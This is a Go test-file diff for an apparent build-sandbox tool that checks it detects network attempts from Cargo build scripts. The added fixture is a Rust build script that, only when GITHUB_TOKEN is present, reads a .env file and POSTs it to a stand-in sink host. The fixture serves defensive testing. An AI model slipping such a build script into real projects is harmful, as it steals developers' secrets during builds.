@@ -344,12 +344,21 @@ func TestLinuxCargoBuildNetworkSecurityCLIIntegration(t *testing.T) {
 
 func TestLinuxCargoEnvironmentTriggeredNetworkCLIIntegration(t *testing.T) {
 	cargoBuildFixtureCLIExpect(t, cargoBuildScriptFixture("fn main() { if std::env::var(\"GITHUB_TOKEN\").is_ok() { let _ = std::net::TcpStream::connect(\"192.0.2.1:443\"); } }\n"), nil, "M3_NETWORK_ATTEMPT")
+	if count := readConditionalCargoBuildObservation(t); count != 1 {
+		t.Fatal("conditional build did not retain exactly one network attempt", count)
+	}
+	t.Log("minimal dormant / mock-development network attempt1 / two persisted states / publication refused")
+}
+
+func readConditionalCargoBuildObservation(t *testing.T) uint64 {
+	t.Helper()
 	evidenceRoot := filepath.Join(os.Getenv("XDG_CACHE_HOME"), "heliopause", "evidence")
 	runs, err := os.ReadDir(evidenceRoot)
 	if err != nil {
 		t.Fatal(err)
 	}
 	found := false
+	var network uint64
 	for _, run := range runs {
 		if !run.IsDir() {
 			continue
@@ -370,9 +379,10 @@ func TestLinuxCargoEnvironmentTriggeredNetworkCLIIntegration(t *testing.T) {
 		var summary struct {
 			Counts map[string]uint64 `json:"counts"`
 		}
-		if json.Unmarshal(body, &record) != nil || json.Unmarshal([]byte(record.Summary), &summary) != nil || record.Kind != "cargo-build-observation" || summary.Counts[string(domain.ObservationNetwork)+":network-attempt"] != 1 {
-			t.Fatal("dummy-env-only activation did not retain exactly one observed network attempt")
+		if json.Unmarshal(body, &record) != nil || json.Unmarshal([]byte(record.Summary), &summary) != nil || record.Kind != "cargo-build-observation" || summary.Counts[string(domain.ObservationNetwork)+":network-attempt"] == 0 {
+			t.Fatal("dummy-env-only activation did not retain an observed network attempt")
 		}
+		network = summary.Counts[string(domain.ObservationNetwork)+":network-attempt"]
 		profiles := map[domain.SandboxEnvironmentProfile]string{}
 		for _, profile := range []domain.SandboxEnvironmentProfile{domain.SandboxEnvironmentMinimal, domain.SandboxEnvironmentDevelopment} {
 			state, err := os.ReadFile(filepath.Join(evidenceRoot, run.Name(), "project-build-workspace-"+string(profile)+".json"))
@@ -389,7 +399,34 @@ func TestLinuxCargoEnvironmentTriggeredNetworkCLIIntegration(t *testing.T) {
 	if !found {
 		t.Fatal("conditional activation observation was not persisted")
 	}
-	t.Log("minimal dormant / mock-development network attempt1 / two persisted states / publication refused")
+	return network
+}
+
+func TestLinuxCargoSyntheticNetworkEnvironmentCLIIntegration(t *testing.T) {
+	const script = `use std::io::{Read, Write};
+use std::net::TcpStream;
+use std::time::Duration;
+fn main() {
+    if std::env::var("GITHUB_TOKEN").is_err() { return; }
+    let mut probe = TcpStream::connect("probe.helox.invalid:80").unwrap();
+    probe.set_read_timeout(Some(Duration::from_secs(1))).unwrap();
+    probe.write_all(b"GET /probe HTTP/1.0\r\nHost: probe.helox.invalid\r\n\r\n").unwrap();
+    let mut response = String::new();
+    probe.take(1024).read_to_string(&mut response).unwrap();
+    assert!(response.starts_with("HTTP/1.0 200"));
+    let dummy = std::fs::read("/tmp/project/.env").unwrap();
+    let mut sink = TcpStream::connect("sink.helox.invalid:80").unwrap();
+    sink.set_read_timeout(Some(Duration::from_secs(1))).unwrap();
+    write!(sink,"POST /sink HTTP/1.0\r\nHost: sink.helox.invalid\r\nContent-Length: {}\r\n\r\n",dummy.len()).unwrap();
+    sink.write_all(&dummy).unwrap();
+    response.clear();
+    sink.take(1024).read_to_string(&mut response).unwrap();
+    assert!(response.starts_with("HTTP/1.0 204"));
+}
+`
+	cargoBuildFixtureCLIExpect(t, cargoBuildScriptFixture(script), nil, "M3_NETWORK_ATTEMPT")
+	network := readConditionalCargoBuildObservation(t)
+	t.Logf("Cargo build-script: fixed DNS/HTTP/dummy sink; network facts=%d; two complete persisted environments and publication refused", network)
 }
 
 func TestLinuxCargoSecondEnvironmentFailureCLIIntegration(t *testing.T) {
